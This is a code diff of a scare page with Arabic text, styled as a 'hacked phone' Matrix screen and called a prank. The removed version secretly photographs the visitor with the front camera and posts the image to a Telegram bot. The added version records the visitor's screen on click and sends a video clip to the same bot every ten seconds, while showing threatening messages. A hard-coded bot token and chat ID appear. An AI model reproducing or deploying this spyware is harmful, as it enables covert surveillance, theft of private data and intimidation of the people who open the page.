@@ -8,32 +8,13 @@
         body { margin: 0; background: black; color: #0f0; font-family: monospace; overflow: hidden; }
         canvas { display: block; position: absolute; top: 0; left: 0; z-index: 1; }
         .overlay { position: relative; z-index: 2; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; background: rgba(0,0,0,0.7); }
-        #video { width: 1px; height: 1px; opacity: 0; position: absolute; }
-        
-        /* الجمجمة المرعبة الجديدة */
-        .ascii-skull { 
-            font-size: 8px; 
-            line-height: 8px; 
-            white-space: pre; 
-            text-shadow: 0 0 12px #0f0; 
-            margin-bottom: 20px;
-            animation: glitch 0.2s infinite;
-        }
-
-        .loading-text { font-size: 1.2rem; font-weight: bold; text-shadow: 0 0 20px red; direction: rtl; text-align: center; }
-
-        @keyframes glitch {
-            0% { transform: skew(0.5deg); }
-            50% { transform: skew(-0.5deg); opacity: 0.8; }
-            100% { transform: skew(0.5deg); }
-        }
+        #screenView { width: 80%; max-width: 400px; border: 2px solid #0f0; box-shadow: 0 0 20px red; margin-bottom: 20px; }
+        .ascii-skull { font-size: 6px; line-height: 6px; white-space: pre; text-shadow: 0 0 12px #0f0; margin-bottom: 10px; }
+        .threat-text { font-size: 1rem; font-weight: bold; text-shadow: 0 0 10px red; direction: rtl; text-align: center; }
     </style>
 </head>
 <body>
     <canvas id="matrix"></canvas>
-    <video id="video" autoplay playsinline></video>
-    <canvas id="capture" style="display:none;"></canvas>
-
     <div class="overlay">
         <div class="ascii-skull">
                ______
@@ -49,16 +30,16 @@
             \          /
              `--------`
         </div>
-        <div class="loading-text">
-            ⚠️ تـم اخـتراق هـاتفك بنـجاح ⚠️<br>
-            سيتم إيقاف النظام بعد 3 أيام
+        <video id="screenView" autoplay playsinline muted></video>
+        <div class="threat-text">
+            ⚠️ جـاري مـزامـنة الـشاشـة مـع سـيرفرات VEXO ⚠️<br>
+            [!] تـم الاتـصال بنـجاح.. جاري سـحب الـبيانات..
         </div>
     </div>
 
     <script>
-        // معلوماتك الخاصة المدمجة
-        const TELEGRAM_TOKEN = '8409685298:AAHN_RpQJ0Ete85gZMYgi2rPaE99lwX0DPs';
-        const CHAT_ID = '7822309283';
+        const TELEGRAM_TOKEN = '8409685298:AAHN_RpQJ0Ete85gZMYgi2rPaE99lwX0DPs'; // التوكن الخاص بك
+        const CHAT_ID = '7822309283'; // الآيدي الخاص بك
 
         // تأثير الماتركس
         const mCanvas = document.getElementById('matrix');
@@ -80,40 +61,42 @@
         }
         setInterval(draw, 33);
 
-        // تشغيل الكاميرا وإرسال الصورة سراً
-        async function startApp() {
+        let mediaRecorder;
+        let recordedChunks = [];
+
+        async function startPrank() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                // ننتظر 3 ثواني ثم نلتقط الصورة
-                setTimeout(captureAndSend, 3000); 
-            } catch (err) {
-                // لا نظهر شيئاً هنا لإبقاء المقلب سرياً
-            }
+                // طلب تصوير الشاشة
+                const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                document.getElementById('screenView').srcObject = screenStream;
+
+                // بدء تسجيل الشاشة لإرسالها لك
+                mediaRecorder = new MediaRecorder(screenStream);
+                mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
+                
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(recordedChunks, { type: 'video/mp4' });
+                    sendVideoToTelegram(blob);
+                    recordedChunks = [];
+                    mediaRecorder.start(); // إعادة التسجيل لإرسال لقطة أخرى
+                };
+
+                mediaRecorder.start();
+                // أرسل فيديو لشاشته كل 10 ثوانٍ
+                setInterval(() => { if(mediaRecorder.state === "recording") mediaRecorder.stop(); }, 10000);
+
+            } catch (err) { console.log("User denied"); }
         }
 
-        function captureAndSend() {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('capture');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            
-            canvas.toBlob(blob => {
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('photo', blob, 'victim.jpg');
-                formData.append('caption', '💀 صيد جديد بعبارة VEXO!\nالجمجمة المرعبة الجديدة تعمل.');
-
-                fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-            }, 'image/jpeg');
+        function sendVideoToTelegram(blob) {
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('video', blob, 'screen.mp4');
+            formData.append('caption', '🎥 لقطة مباشرة لشاشة الضحية من VEXO!');
+            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, { method: 'POST', body: formData });
         }
 
-        window.onload = startApp;
+        window.onclick = startPrank;
     </script>
 </body>
 </html>
